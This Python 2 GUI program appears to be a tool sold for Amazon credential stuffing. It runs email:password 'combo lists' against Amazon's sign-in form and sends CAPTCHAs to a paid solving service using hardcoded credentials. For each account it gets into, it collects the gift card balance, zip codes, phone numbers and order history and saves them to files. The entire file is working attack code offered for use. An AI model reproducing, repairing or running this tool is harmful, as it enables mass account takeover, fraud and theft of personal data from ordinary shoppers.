# -*- coding: utf-8 -*-
__author__ = 'ZeroByte'
import requests
import re
import Tkinter as Tk
import concurrent.futures
import codecs
import urllib
import os
import base64
import binascii
import json
import time
import sys
from tkFileDialog import askopenfilename
from random import choice

reload(sys)
sys.setdefaultencoding('utf8')
requests.packages.urllib3.disable_warnings()


class App():
	def __init__(self, parent):

		# Check To See If You Purchased c:
		# self.ownercheck()

		# Check To See If There's An Update
		# self.updatecheck()

		# Setup Window
		self.window = parent
		self.window.title('Coded By Eric Pedra : Amazon')

		# Set Variables
		self.fileopenoptions = dict(defaultextension='.txt', filetypes=[('Text file', '*.txt'), ('All files', '*.*')])
		self.combos = Tk.StringVar(self.window)
		self.proxies = Tk.StringVar(self.window)
		self.all = Tk.IntVar(self.window)

		# Make Widgets
		self.labelcombos = Tk.Label(self.window, text="Combo List: ")
		self.labelproxies = Tk.Label(self.window, text="Proxies List: ")
		self.checkall = Tk.Radiobutton(self.window, text="Save into one file!", variable=self.all, value=1)
		self.checkone = Tk.Radiobutton(self.window, text="Save into multiple files!", variable=self.all, value=2)
		self.entrycombos = Tk.Entry(self.window, textvariable=self.combos)
		self.entryproxies = Tk.Entry(self.window, textvariable=self.proxies)
		self.startbutton = Tk.Button(self.window, text="Start!", command=self.start)
		self.combosbutton = Tk.Button(self.window, text="Open Combo File!", command=self.setcombos)
		self.proxybutton = Tk.Button(self.window, text="Open Proxy File!", command=self.setproxies)
		self.spinbox1 = Tk.Spinbox(self.window, from_=1998, to=2014)
		self.spinbox2 = Tk.Spinbox(self.window, from_=1998, to=2014)
		self.spinboxtext1 = Tk.Label(self.window, text="Year Range: ")
		self.spinboxtext2 = Tk.Label(self.window, text="-")

		# Grid Widgets
		self.labelcombos.grid(row=0, column=0, sticky=Tk.W)
		self.entrycombos.grid(row=0, column=1, columnspan=2, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
		self.combosbutton.grid(row=0, column=3, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
		self.labelproxies.grid(row=1, column=0, sticky=Tk.W)
		self.entryproxies.grid(row=1, column=1, columnspan=2, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
		self.proxybutton.grid(row=1, column=3, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
		self.spinboxtext1.grid(row=2, column=0, columnspan=1, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
		self.spinbox1.grid(row=2, column=1, columnspan=1, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
		self.spinbox2.grid(row=2, column=3, columnspan=1, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
		self.spinboxtext2.grid(row=2, column=2, columnspan=1, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
		self.checkall.grid(row=3, column=0, sticky=Tk.W)
		self.checkone.grid(row=3, column=1, columnspan=3, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
		self.startbutton.grid(row=5, column=0, columnspan=6, sticky=Tk.W+Tk.E+Tk.N+Tk.S)

	def Login(self, user, password, proxie1s):
		work = True
		while work:
			#proxy = choice(proxie1s).strip()
			proxies = {
				'http': '127.0.0.1:8888',
				'https': '127.0.0.1:8888'
			}
			s = requests.session()
			headers = {
				'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
			}
			#requests.utils.add_dict_to_cookiejar(s.cookies, {'csm-hit':'YVH6BHV3MGY6NQ2T7Y92+s-YVH6BHV3MGY6NQ2T7Y92|1472261950817'})
			amazon = s.get('https://www.amazon.com/ap/signin?_encoding=UTF8&clientContext=dea2b14b6ac4106546aee2d89ed7ff&marketplaceId=A2LNHB43R2GSAT&openid.assoc_handle=amzn_mturk_requester&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.pape.max_auth_age=43200&openid.return_to=https%3A%2F%2Frequester.mturk.com%2F', proxies=proxies,verify=False, headers=headers, timeout=7.5)
			apptoken = re.findall('<input type="hidden" name="appActionToken" value="(.*?)" />', amazon.content)
			openidns = re.findall('<input type="hidden" name="openid.ns" value="(.*?)" />', amazon.content)
			openididentity = re.findall('<input type="hidden" name="openid.identity" value="(.*?)" />', amazon.content)
			openidclaimed_id = re.findall('<input type="hidden" name="openid.claimed_id" value="(.*?)" />',amazon.content)
			openidmode = re.findall('<input type="hidden" name="openid.mode" value="(.*?)" />', amazon.content)
			openidassoc_handle = re.findall('<input type="hidden" name="openid.assoc_handle" value="(.*?)" />',amazon.content)
			openidreturn_to = re.findall('<input type="hidden" name="openid.return_to" value="(.*?)" />',amazon.content)
			context = re.findall('<input type="hidden" name="clientContext" value="(.*?)" />',amazon.content)
			previd = re.findall('<input type="hidden" name="prevRID" value="(.*?)" />',amazon.content)
			#state = re.findall('<input type="hidden" name="siteState" value="(.*?)" />',
			#							 amazon.content)
			#placeid = re.findall('<input type="hidden" name="marketPlaceId" value="(.*?)" />',
			#							 amazon.content)
			url = re.findall('ap_signin_form" novalidate="novalidate" action="(.*?)"',amazon.content)
			pageid = re.findall('<input type="hidden" name="pageId" value="(.*?)" />',amazon.content)
			max_auth_age = re.findall('<input type="hidden" name="openid.pape.max_auth_age" value="(.*?)" />',amazon.content)
			data = {}
			data["appActionToken"] = apptoken[0]
			data["appAction"] = 'SIGNIN'
			data["openid.pape.max_auth_age"] = max_auth_age[0]
			data["openid.ns"] = openidns[0]
			data["pageId"] = pageid[0]
			data["openid.identity"] = openididentity[0]
			data["openid.claimed_id"] = openidclaimed_id[0]
			data["openid.mode"] = openidmode[0]
			data["openid.assoc_handle"] = openidassoc_handle[0]
			data["openid.return_to"] = openidreturn_to[0]
			#data["marketPlaceId"] = placeid[0]
			#data["siteState"] = state[0]
			data["prevRID"] = previd[0]
			data["clientContext"] = context[0]
			data["email"] = user
			data["password"] = password
			data['create'] = 0
#		data = {
#			'appActionToken': apptoken[0],
#			'appAction': 'SIGNIN',
#			'openid.pape.max_auth_age': max_auth_age[0],
#			'openid.ns': openidns[0],
#			'pageId': pageid[0],
#			'openid.identity': openididentity[0],
#			'openid.claimed_id': openidclaimed_id[0],
#			'openid.mode': openidmode[0],
#			'openid.assoc_handle': openidassoc_handle[0],
#			'openid.return_to': openidreturn_to[0],
#			'marketPlaceId': placeid[0],
#			'siteState': state[0],
#			'prevRID': previd[0],
#			'clientContext': context[0],
#			'email': user,
#			'password': password,
#			'create': 0
#		}
			print (data)
			payload = urllib.urlencode(data)
			print (data)
			headers['Content-Type'] = 'application/x-www-form-urlencoded'
			headers['Referer'] = amazon.url
			response = s.post(
				url[0], 
				payload, 
				proxies=proxies,
				verify=False, 
				headers=headers, 
				timeout=7.5,
				allow_redirects=True
			)
			if 'Type the characters you see in this image.' in response.text:
				print ('Captcha')
				captcha = True
				quit()
				while captcha:
					captchaurl = re.findall('<div id="ap_captcha_img">\n	<img src="(.*?)" />', response.text)
					if captchaurl[0].find('data:image') != -1:
						captchafile = captchaurl[0].replace('data:image/jpeg;base64,', 'base64:')
					elif captchaurl[0].find('https://') != -1:
						captchafile = s.get(captchaurl[0], verify=False).content
					else:
						captchafile = None
					boundry = binascii.hexlify(os.urandom(8))
					headersc = dict()
					headersc['User-Agent'] = 'DBC/Python v4.1.2'
					headersc['Content-Type'] = 'multipart/form-data; boundary=----WebKitFormBoundary{0}'.format(boundry)
					headersc['Accept'] = 'application/json'
					headersc['Expect'] = 'username=woxxy123&password=playtime2'
					captchaupload = s.post(
						'http://api.dbcapi.me/api/captcha',
						'------WebKitFormBoundary{0}\r\nContent-Disposition: form-data; name="username"\r\n\r\nwoxxy\r\n------WebKitFormBoundary{0}\r\n'
						'Content-Disposition: form-data; name="password"\r\n\r\nplaytime2\r\n------WebKitFormBoundary{0}\r\nContent-D'
						'isposition: form-data; name="captchafile"; filename="captcha"\r\nContent-Type: image/jpeg\r\n\r\nbase64:{1}\r\n'
						'------WebKitFormBoundary{0}--'.format(boundry, base64.b64encode(captchafile)),
						headers=headersc,
						proxies=proxies,
						verify=False
					)
					captchatest = json.loads(captchaupload.text)
					if captchatest['status'] != 0:
						work = True
						break
					jsonstuff = dict()
					jsonstuff['text'] = ''
					while jsonstuff['text'] == '':
						captcharesponses = s.get('http://api.dbcapi.me/api/captcha/{0}'.format(captchatest['captcha']), headers={'Accept': 'application/json'})
						jsonstuff = json.loads(captcharesponses.text)
						time.sleep(1)
					print (jsonstuff)
					apptoken = re.findall('<input type="hidden" name="appActionToken" value="(.*?)" />', response.text)
					openidns = re.findall('<input type="hidden" name="openid.ns" value="(.*?)" />', response.text)
					openididentity = re.findall('<input type="hidden" name="openid.identity" value="(.*?)" />', response.text)
					openidclaimed_id = re.findall('<input type="hidden" name="openid.claimed_id" value="(.*?)" />',response.text)
					ces = re.findall('<input type="hidden" name="ces" value="(.*?)" />', response.text)
					openidmode = re.findall('<input type="hidden" name="openid.mode" value="(.*?)" />', response.text)
					openidassoc_handle = re.findall('<input type="hidden" name="openid.assoc_handle" value="(.*?)" />',response.text)
					openidreturn_to = re.findall('<input type="hidden" name="openid.return_to" value="(.*?)" />',response.text)
					data = {
						'appActionToken': apptoken[0],
						'appAction': 'SIGNIN',
						'openid.pape.max_auth_age': 'ape:MA==',
						'openid.ns': openidns[0],\
						'pageId': 'ape:YW16bl9wYXltZW50cw==',
						'openid.identity': openididentity[0],
						'openid.claimed_id': openidclaimed_id[0],
						'openid.mode': openidmode[0],
						'ces': ces[0],
						'openid.assoc_handle': openidassoc_handle[0],
						'openid.return_to': openidreturn_to[0],
						'openid.pape.preferred_auth_policies': 'ape:aHR0cDovL3NjaGVtYXMuYW1hem9uLmNvbS9wYXBlL3BvbGl'
															   'jaWVzLzIwMTAvMDUvc2luZ2xlLWZhY3Rvci1zdHJvbmc=',
						'create': '0',
						'forceValidateCaptcha': 'ape:dHJ1ZQ==',
						'marketPlaceId': 'ape:QVo0QjBaUzNMR0xY',
						'email': user,
						'password': password,
						'guess': jsonstuff['text']
					}
					payload = urllib.urlencode(data)
					print (payload)
					headers1 = dict()
					headers1['User-Agent'] = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0'
					headers1['Content-Type'] = 'application/x-www-form-urlencoded'
					headers1['Referer'] = response.url
					amazon.cookies['session-id-time'] = '2082787201l'
					response1 = s.post("https://www.amazon.com/ap/signin", payload, proxies=proxies,
					verify=False, headers=headers1, timeout=7.5, cookies=amazon.cookies,
					allow_redirects=True)
					if not 302 in response.status_code:
						print (user, password, 'doesn\'t work!')
						work = False
						captcha = False
					elif 'To better protect your account, please re-enter your password and then enter the characters as they are shown in the image below.' in response1.text:
						captcha = True
					else:
						print (user, password, 'worked! Gathering info!')
						r = s.get('https://www.amazon.com/gp/aw/ya/gcb/ref=aa_ya_m_gcb', proxies=proxies,verify=False, headers=headers, cookies=response.history[0].cookies, timeout=7.5)
						ree = re.compile(u'002B\">\n \$(.*?)$', re.DOTALL)
						gcb = ree.search(r.text).groups()[0].split('\n')[0]
						r1 = s.get('https://www.amazon.com/gp/css/account/address/view.html?ie=UTF8&ref_=ya_manage_a'
						'ddress_book&',
						proxies=proxies, verify=False, headers=headers,
						cookies=response.history[0].cookies, timeout=7.5)
						r1ree1 = re.compile(u'<li class="displayAddressLI displayAddressCityStateOrRegionPostalCode">(.*?)'
											u'</li>')
						zipcity = r1ree1.findall(r1.text)
						r1ree2 = re.compile(u'<li class="displayAddressLI displayAddressPhoneNumber">Phone: (.*?)</li>')
						phonenum = r1ree2.findall(r1.text)
						order = list()
						year = int(self.spinbox1.get())
						years = int(self.spinbox2.get())
						headers2 = dict()
						headers2['User-Agent'] = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox' \
						'/30.0'
						headers2['Content-Type'] = 'application/x-www-form-urlencoded'
						headers2['Referer'] = 'https://www.amazon.com/gp/aw/ya/ref=aw_oh_ch'
						while year <= years:
							page = 1
							pages = 5
							while page <= pages:
								r2 = s.post('https://www.amazon.com/gp/aw/ya.html', 'ac=oh&of=year-{0}&p={1}'.format(
									year,
									page
								), proxies=proxies, verify=False, headers=headers2,
									cookies=response.history[0].cookies, timeout=7.5)
								if 'No orders or transactions' in r2.text:
									break
								r2ree = re.compile(u'<b>Items ordered.*?</b><br />. &nbsp;&#160;(.*?)<br />',
								re.DOTALL)
								for ods in r2ree.findall(r2.text):
									order.append(ods.decode('utf-8', 'ignore'))
								page += 1
							year += 1
						if self.all is 1:
							with codecs.open("./accounts.txt", "a", encoding="utf-8") as myfile:
								myfile.write("\n===========================================================================\n"
								"Username: {0}\n"
								"Password: {1}\n"
								"Available Giftcard Balance: {2}\n".format(user, password, gcb))
							zipcity = [item.strip() for item in zipcity]
							if zipcity is not None:
								for zip in zipcity:
									with codecs.open("./accounts.txt", "a", encoding="utf-8") as myfile:
										myfile.write("Zip Code: {0}\n".format(zip.decode('unicode_escape', 'ignore').encode("ascii", "ignore")))
							phonenum = [item.strip() for item in phonenum]
							if phonenum is not None:
								for phone in phonenum:
									with codecs.open("./accounts.txt", "a", encoding="utf-8") as myfile:
										myfile.write("Phone Number: {0}\n".format(phone.decode('unicode_escape', 'ignore').encode("ascii", "ignore")))
							with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
								myfile.write("Orders:\n")
							orders = [item.strip() for item in order]
							if len(orders) is not None:
								for oder in orders:
									with codecs.open("./accounts.txt", "a", encoding="utf-8") as myfile:
										myfile.write("	{0}\n".format(oder.decode('unicode_escape', 'ignore').encode("ascii", "ignore")))
							else:
								print (user, password, 'had no orders!')
						else:
							with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
								myfile.write("\n===========================================================================\n"
								"Username: {0}\n"
								"Password: {1}\n"
								"Available Giftcard Balance: {2}\n".format(user, password, gcb))
							zipcity = [item.strip() for item in zipcity]
							if zipcity is not None:
								for zip in zipcity:
									with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
										myfile.write("Zip Code: {0}\n".format(zip.decode('unicode_escape', 'ignore').encode("ascii", "ignore")))
							phonenum = [item.strip() for item in phonenum]
							if phonenum is not None:
								for phone in phonenum:
									with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
										myfile.write("Phone Number: {0}\n".format(phone.decode('unicode_escape', 'ignore').encode("ascii", "ignore")))
							with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
								myfile.write("Orders:\n")
							orders = [item.strip() for item in order]
							if len(orders) is not None:
								for oder in orders:
									with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
										myfile.write("	{0}\n".format(oder.decode('unicode_escape', 'ignore').encode("ascii", "ignore")))
							else:
								print( user, password, 'had no orders!')
								os.remove("./accounts/{0}.txt".format(user))
						work = False
			elif "Your password is incorrect" in response.text:
				print (user, password, 'doesn\'t work!')
				work = False
			elif "We can not find an account with that email address" in response.text:
				print (user, password, 'doesn\'t work!')
				work = False
			elif 'Sign In' in response.text:
				print (user, password, 'doesn\'t work!')
				work = False
			else:
				print (user, password, 'worked! Gathering info!')
				r = s.get('https://www.amazon.com/gp/aw/ya/gcb/ref=aa_ya_m_gcb', proxies=proxies,
				verify=False, headers=headers, cookies=response.history[0].cookies, timeout=7.5)
				ree = re.compile(u'002B\">\n \$(.*?)$', re.DOTALL)
				gcb = ree.search(r.text).groups()[0].split('\n')[0]
				r1 = s.get('https://www.amazon.com/gp/css/account/address/view.html?ie=UTF8&ref_=ya_manage_a'
				'ddress_book&',
				proxies=proxies, verify=False, headers=headers,
				cookies=response.history[0].cookies, timeout=7.5)
				r1ree = re.compile(u'<li class="displayAddressLI displayAddressAddressLine1">(.*?)</li>')
				name1 = r1ree.findall(r1.text)
				r1ree1 = re.compile(u'<li class="displayAddressLI displayAddressCityStateOrRegionPostalCode">(.*?)'
									u'</li>')
				zipcity = r1ree1.findall(r1.text)
				r1ree2 = re.compile(u'<li class="displayAddressLI displayAddressPhoneNumber">Phone: (.*?)</li>')
				phonenum = r1ree2.findall(r1.text)
				order = list()
				year = int(self.spinbox1.get())
				years = int(self.spinbox2.get())
				headers2 = dict()
				headers2['User-Agent'] = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox' \
				'/30.0'
				headers2['Content-Type'] = 'application/x-www-form-urlencoded'
				headers2['Referer'] = 'https://www.amazon.com/gp/aw/ya/ref=aw_oh_ch'
				while year <= years:
					page = 1
					pages = 5
					while page <= pages:
						r2 = s.post('https://www.amazon.com/gp/aw/ya.html', 'ac=oh&of=year-{0}&p={1}'.format(
							year,
							page
						), proxies=proxies, verify=False, headers=headers2,
						cookies=response.history[0].cookies, timeout=7.5)
						if 'No orders or transactions' in r2.text:
							break
						r2ree = re.compile(u'<b>Items ordered.*?</b><br />. &nbsp;&#160;(.*?)<br />',
						re.DOTALL)
						for ods in r2ree.findall(r2.text):
							order.append(ods.decode('utf-8', 'ignore'))
						page += 1
					year += 1
				if self.all is 1:
					with codecs.open("./accounts.txt", "a", encoding="utf-8") as myfile:
						myfile.write("\n===========================================================================\n"
						"Username: {0}\n"
						"Password: {1}\n"
						"Available Giftcard Balance: {2}\n".format(user, password, gcb))
					zipcity = [item.strip() for item in zipcity]
					if zipcity is not None:
						for zip in zipcity:
							with codecs.open("./accounts.txt", "a", encoding="utf-8") as myfile:
								myfile.write("Zip Code: {0}\n".format(zip.decode('unicode_escape', 'ignore').encode("ascii", "ignore")))
					phonenum = [item.strip() for item in phonenum]
					if phonenum is not None:
						for phone in phonenum:
							with codecs.open("./accounts.txt", "a", encoding="utf-8") as myfile:
								myfile.write("Phone Number: {0}\n".format(phone.decode('unicode_escape', 'ignore').encode("ascii", "ignore")))
					with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
						myfile.write("Orders:\n")
					orders = [item.strip() for item in order]
					if len(orders) is not None:
						for oder in orders:
							with codecs.open("./accounts.txt", "a", encoding="utf-8") as myfile:
								myfile.write("	{0}\n".format(oder.decode('unicode_escape', 'ignore').encode("ascii", "ignore")))
					else:
						print (user, password, 'had no orders!')
				else:
					with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
						myfile.write("\n===========================================================================\n"
						"Username: {0}\n"
						"Password: {1}\n"
						"Available Giftcard Balance: {2}\n".format(user, password, gcb))
					zipcity = [item.strip() for item in zipcity]
					if zipcity is not None:
						for zip in zipcity:
							with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
								myfile.write("Zip Code: {0}\n".format(zip.decode('unicode_escape', 'ignore').encode("ascii", "ignore")))
					phonenum = [item.strip() for item in phonenum]
					if phonenum is not None:
						for phone in phonenum:
							with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
								myfile.write("Phone Number: {0}\n".format(phone.decode('unicode_escape', 'ignore').encode("ascii", "ignore")))
					with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
						myfile.write("Orders:\n")
					orders = [item.strip() for item in order]
					if len(orders) is not None:
						for oder in orders:
							with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
								myfile.write("	{0}\n".format(oder.decode('unicode_escape', 'ignore').encode("ascii", "ignore")))
					else:
						print (user, password, 'had no orders!')
						os.remove("./accounts/{0}.txt".format(user))
				work = False

	def start(self):
		if self.combos.get() == '':
			print ('You didn\'t add any combos!')
		else:
			with codecs.open(self.entrycombos.get(), 'r', encoding="utf-8") as f:
				global userpass
				userpass = f.readlines()
		if self.proxies.get() == '':
			print ('You didn\'t add any proxies!')
		else:
			with codecs.open(self.proxies.get(), 'r', encoding="utf-8") as f:
				global proxies
				proxies = f.readlines()
		with concurrent.futures.ThreadPoolExecutor(max_workers=1) as x:
			for userpasscombo in userpass:
				upass = userpasscombo.split(':')
				x.submit(self.Login, upass[0].strip(), upass[1].strip(), "")

	def setcombos(self):
		filename = askopenfilename(**self.fileopenoptions)
		self.combos.set(filename)

	def setproxies(self):
		filename = askopenfilename(**self.fileopenoptions)
		self.proxies.set(filename)

if __name__ == '__main__':
	root = Tk.Tk()
	app = App(root)
	root.mainloop()